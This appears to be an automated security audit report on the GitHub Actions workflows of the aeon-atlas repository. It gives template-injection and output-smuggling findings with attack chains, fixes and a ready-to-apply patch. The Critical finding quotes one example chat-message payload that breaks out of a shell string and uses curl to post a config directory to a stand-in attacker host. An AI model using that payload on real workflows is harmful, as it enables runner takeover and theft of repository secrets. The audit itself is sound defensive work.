# Workflow Security Audit — 2026-11-15

**Verdict:** WORKFLOW_AUDIT_NEW_CRITICAL — 1 new critical finding
**Repo:** [swarm-ai-research/aeon-atlas](https://github.com/swarm-ai-research/aeon-atlas)
**Files audited:** 5 (5 workflows, 0 composite actions)
**Findings this run:** 6 (1 critical, 2 high, 3 medium, 0 low)
**Delta vs 2026-04-11:** 4 new, 0 reintroduced, 2 unchanged, 4 resolved
**Auto-fixed:** 3 (prepared — see push note)

> **⚠️ Push note.** The three auto-fixes below were generated and validated locally, but the Actions token available on this run (`GITHUB_TOKEN`, a GitHub App installation token) **lacks the `workflows` permission**, so the edited `.github/workflows/*` files could not be pushed (`refusing to allow a GitHub App to create or update workflow … without workflows permission`). The exact unified diff is in the **Appendix** — apply it with a `GH_GLOBAL`-scoped PAT (or merge this PR and let a `workflows`-permitted run commit it). Until applied, the Critical finding remains live.

> **Scan mode: DEGRADED.** This runner's permission layer blocked installing and executing both `zizmor` (pip/pipx install denied) and `actionlint` (binary execution denied). All findings below come from the skill's hand-rolled pattern checks plus a full manual read of every workflow file. The three injection findings are high-confidence (verbatim vulnerable snippets quoted); zizmor's broader coverage (unpinned-uses, excessive-permissions, credential-persistence heuristics) was unavailable, so lower-severity findings may be undercounted. See **Source status**.

## Regressions (previously-fixed findings now present again)

None. The two Critical script-injection fixes from the 2026-04-11 audit (env-var intermediaries in `messages.yml`) are still in place and held.

## New findings

### [CRITICAL] template-injection — toJson(client_payload) echoed into a single-quoted shell string
**File:** `.github/workflows/messages.yml` · **Step:** `Extract message` · **Line:** 577
**Pattern:**
```yaml
MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
```

**Attack chain:**
1. **Entry:** `repository_dispatch` with action `telegram-message` / `discord-message` / `slack-message` — these dispatch types exist to relay inbound chat messages from an external forwarder that holds a repo PAT.
2. **Vector:** `github.event.client_payload.message` carries verbatim text an external user sent to the bot's channel. `toJson(...)` JSON-encodes it (escaping `"` and `\`) but **does not escape single quotes**, and the result is pasted between literal `'...'` by GitHub's template engine *before* the shell parses the line.
3. **Sink:** a `'`-containing message closes the single-quoted string early; the remainder is interpreted by `/bin/sh`. e.g. message `'; curl -d @$HOME/.config evil.tld; echo '` → command substitution runs.
4. **Reachable secrets:** the `run` job's env exposes `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `GH_GLOBAL`, `ALCHEMY_API_KEY`, `COINGECKO_API_KEY`, `XAI_API_KEY`, all notify tokens.
5. **Blast radius:** full RCE on the runner with `GH_GLOBAL` (fine-grained PAT able to push to protected paths and dispatch workflows) → repo compromise and secret exfiltration.

**Fix:**
```yaml
# BEFORE
run: |
  MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')

# AFTER
env:
  _PAYLOAD: ${{ toJson(github.event.client_payload.message) }}
run: |
  MESSAGE=$(printf '%s' "$_PAYLOAD" | jq -r '.')
```
Passing the value through an `env:` key means the shell never re-parses it; `printf '%s'` + `jq -r '.'` decodes the JSON string exactly as before.

**Status:** ✅ Fix prepared (Appendix patch) — push blocked by `workflows`-token limitation; apply with `GH_GLOBAL`

---

### [HIGH] template-injection — `inputs.chain` interpolated directly into the chain-runner shell
**File:** `.github/workflows/chain-runner.yml` · **Steps:** `Run chain` (line 41), `Update cron state` (line 287)
**Pattern:**
```yaml
run: |
  set -euo pipefail
  CHAIN="${{ inputs.chain }}"
```

**Attack chain:**
1. **Entry:** `workflow_dispatch` on `chain-runner.yml` — reachable by any principal with `actions: write` (collaborators, and any token that can dispatch workflows).
2. **Vector:** `inputs.chain` is substituted into the `run:` block before shell parsing. A value like `$(…)` or `"; …; "` breaks the assignment.
3. **Sink:** the surrounding shell runs with `set -euo pipefail` but that does not stop injected commands.
4. **Reachable secrets:** `GH_GLOBAL` (PAT) is in both affected steps' env.
5. **Blast radius:** RCE with the PAT — can dispatch arbitrary skills via `aeon.yml`, push to the repo, and read other secrets reachable from dispatched runs.

**Fix:**
```yaml
# BEFORE
env:
  GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
run: |
  CHAIN="${{ inputs.chain }}"

# AFTER
env:
  GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
  _CHAIN: ${{ inputs.chain }}
run: |
  CHAIN="$_CHAIN"
```

**Status:** ✅ Fix prepared (Appendix patch, both steps) — push blocked by `workflows`-token limitation

---

### [HIGH] template-injection — `inputs.chain_context_file` interpolated directly into the aeon.yml Run shell
**File:** `.github/workflows/aeon.yml` · **Step:** `Run` · **Line:** 463
**Pattern:**
```yaml
run: |
  CHAIN_CTX="${{ inputs.chain_context_file }}"
```

**Attack chain:**
1. **Entry:** `workflow_dispatch` / `workflow_call` on `aeon.yml` — reachable by principals with `actions: write`. (`chain-runner.yml` populates this input legitimately from a skill-name-derived path, but the dispatch surface accepts arbitrary strings.)
2. **Vector:** `inputs.chain_context_file` is pasted into the `run:` block pre-parse. While `inputs.skill` and `inputs.var` are already hardened (regex-validated / env-passed), this input was not.
3. **Sink:** shell assignment in the step that also holds the full secret env block (`ANTHROPIC_API_KEY`, `GH_GLOBAL`, `BANKR_LLM_KEY`, and every notify/API token).
4. **Reachable secrets:** the largest env block in the fleet — every secret the agent run needs.
5. **Blast radius:** RCE with the full secret set and `GH_GLOBAL`.

**Fix:**
```yaml
# BEFORE
env:
  INPUT_MODEL: ${{ inputs.model }}
run: |
  CHAIN_CTX="${{ inputs.chain_context_file }}"

# AFTER
env:
  INPUT_MODEL: ${{ inputs.model }}
  _CHAIN_CTX: ${{ inputs.chain_context_file }}
run: |
  CHAIN_CTX="$_CHAIN_CTX"
```

**Status:** ✅ Fix prepared (Appendix patch) — push blocked by `workflows`-token limitation

---

### Medium / Low findings

| Severity | Rule | File · Step | Line | Note | Status |
|---|---|---|---|---|---|
| Medium | output-smuggling | `ecosystem-from-issue.yml` · `Parse + append entry` | 36–41 | Node-script output (derived from external `issue.body`) is streamed into `$GITHUB_OUTPUT` with a static `<<EOF` heredoc delimiter. A crafted issue whose parsed output contains a lone `EOF` line can terminate the heredoc early and smuggle additional output keys (e.g. force `rc=0`, inject `ADDED_ROW`). Impact bounded to the feature's own PR-creation path, but it defeats the validation gate. Fix: use a randomized delimiter (`EOF_$RANDOM` / `$(uuidgen)`). | Manual required |
| Medium | unpinned-uses | all workflows | — | `actions/checkout`, `actions/setup-node` pinned to mutable tags (`@v4`/`@v5`). `actions/*` is GitHub-controlled (low risk) but violates supply-chain pinning. Unchanged since 2026-04-11. | Manual required |
| Medium | excessive-permissions | `messages.yml` · workflow-level | 20–24 | `actions: write` granted workflow-wide; only the `tick` (poll) job needs it to `gh workflow run`. The `run` job — which executes user/prompt-controlled messages via Claude — inherits it too. Split permissions per-job. Unchanged since 2026-04-11. | Manual required |

> Note: `unpinned-uses` and `excessive-permissions` are per the skill flagged **Manual only** (never auto-fixed — pinning needs SHA verification, permission scoping needs operator judgment).

## Carried over (unchanged)

| Severity | Rule | File | First seen |
|---|---|---|---|
| Medium | unpinned-uses | all workflows | 2026-04-11 |
| Medium | excessive-permissions (`actions: write`) | `.github/workflows/messages.yml` | 2026-04-11 |

## Resolved since 2026-04-11

- **[CRITICAL]** Script injection via `steps.msg.outputs.message` in `messages.yml` `Run` step — env-var intermediary (`_MSG_MESSAGE`) is in place and held.
- **[CRITICAL]** Script injection via `inputs.message` in `messages.yml` `Extract message` step — `_INPUT_MESSAGE` intermediary in place and held.
- **[MEDIUM]** `Log token usage` / `Commit results` steps interpolating `steps.msg.outputs.source` — now use `_LOG_SOURCE` / `_COMMIT_SOURCE`.
- **[LOW]** `scheduler.yml` `GH_GLOBAL || GITHUB_TOKEN` fallback — `scheduler.yml` has been removed; its scheduling logic moved into the `messages.yml` `tick` job (which legitimately needs `GH_GLOBAL` to dispatch workflows).

## Source status

- zizmor: **fail** (pip/pipx install blocked by runner permission layer; binary execution denied)
- actionlint: **fail** (tarball downloaded, but binary extraction/execution denied by permission layer)
- hand-rolled: **ok**

Because both external scanners were unavailable, this run is **DEGRADED**. The reported injection findings were produced by the skill's hand-rolled checks (toJson-into-shell check; fleet-specific `inputs.*` → shell check) and confirmed by manual review. A follow-up run on a runner that permits `pipx install zizmor` should be scheduled to backstop coverage gaps.

## Appendix — ready-to-apply patch (3 auto-fixes)

Apply with a `workflows`-permitted token: `git apply` the diff below, or re-run this skill from a workflow where `GH_GLOBAL` is configured.

```diff
diff --git a/.github/workflows/aeon.yml b/.github/workflows/aeon.yml
--- a/.github/workflows/aeon.yml
+++ b/.github/workflows/aeon.yml
@@ -273,6 +273,7 @@ jobs:
           SKILL_VAR: ${{ inputs.var }}
           SKILL_NAME: ${{ steps.skill.outputs.name }}
           INPUT_MODEL: ${{ inputs.model }}
+          _CHAIN_CTX: ${{ inputs.chain_context_file }}
         run: |
           TODAY=$(date -u +%Y-%m-%d)
           export SKILL_NAME
@@ -460,7 +461,7 @@ jobs:
           VAR="$SKILL_VAR"
 
           # Build prompt — inject chain context if running as part of a chain
-          CHAIN_CTX="${{ inputs.chain_context_file }}"
+          CHAIN_CTX="$_CHAIN_CTX"
           if [ -n "$CHAIN_CTX" ] && [ -f "$CHAIN_CTX" ]; then
             CONTEXT=$(cat "$CHAIN_CTX")
             PROMPT="Today is $TODAY.
diff --git a/.github/workflows/chain-runner.yml b/.github/workflows/chain-runner.yml
--- a/.github/workflows/chain-runner.yml
+++ b/.github/workflows/chain-runner.yml
@@ -36,9 +36,10 @@ jobs:
       - name: Run chain
         env:
           GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
+          _CHAIN: ${{ inputs.chain }}
         run: |
           set -euo pipefail
-          CHAIN="${{ inputs.chain }}"
+          CHAIN="$_CHAIN"
           NOW_ISO=$(date -u +%FT%TZ)
           echo "Running chain: $CHAIN"
 
@@ -283,8 +284,9 @@ jobs:
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_GLOBAL || secrets.GITHUB_TOKEN }}
+          _CHAIN: ${{ inputs.chain }}
         run: |
-          CHAIN="${{ inputs.chain }}"
+          CHAIN="$_CHAIN"
           NOW_ISO=$(date -u +%FT%TZ)
           STATUS="${CHAIN_STATUS:-failed}"
           STATE_FILE="memory/cron-state.json"
diff --git a/.github/workflows/messages.yml b/.github/workflows/messages.yml
--- a/.github/workflows/messages.yml
+++ b/.github/workflows/messages.yml
@@ -572,9 +572,10 @@ jobs:
         env:
           _INPUT_MESSAGE: ${{ inputs.message }}
           _INPUT_SOURCE: ${{ inputs.source }}
+          _PAYLOAD: ${{ toJson(github.event.client_payload.message) }}
         run: |
           if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
-            MESSAGE=$(echo '${{ toJson(github.event.client_payload.message) }}' | jq -r '.')
+            MESSAGE=$(printf '%s' "$_PAYLOAD" | jq -r '.')
             TYPE="${{ github.event.action }}"
             SOURCE="webhook"
             case "$TYPE" in
```

<!--
workflow-security-audit-fingerprints
9e80b2b87d24bfd2 severity=Critical status=fix-pending rule=template-injection file=.github/workflows/messages.yml step=Extract_message
60135c1e5de6764b severity=High status=fix-pending rule=template-injection file=.github/workflows/chain-runner.yml step=Run_chain
d06cd31b0565bb63 severity=High status=fix-pending rule=template-injection file=.github/workflows/aeon.yml step=Run
667d5161dc6c342e severity=Medium status=manual rule=output-smuggling file=.github/workflows/ecosystem-from-issue.yml step=Parse
d814d315c2117d9b severity=Medium status=manual rule=unpinned-uses file=all step=all
d1fde8344ce7f3cc severity=Medium status=manual rule=excessive-permissions file=.github/workflows/messages.yml step=workflow
-->
